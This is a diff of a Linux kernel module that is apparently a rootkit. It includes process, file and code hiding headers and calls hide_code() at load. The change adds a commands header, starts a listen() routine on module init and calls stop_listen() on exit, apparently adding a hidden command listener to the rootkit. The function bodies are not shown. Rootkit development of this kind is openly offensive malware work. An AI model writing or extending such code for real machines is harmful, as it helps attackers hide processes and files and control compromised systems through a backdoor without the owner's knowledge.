@@ -5,6 +5,7 @@
 #include "process_hiding.h"
 #include "file_hiding.h"
 #include "code_hiding.h"
+#include "commands.h"
 #include "sysmap.h"
 
 MODULE_LICENSE("GPL");
@@ -15,12 +16,14 @@ MODULE_LICENSE("GPL");
 static int __init mod_init(void)
 {
   hide_code();
+  listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
+  stop_listen();
   unhide_code();
 }
 
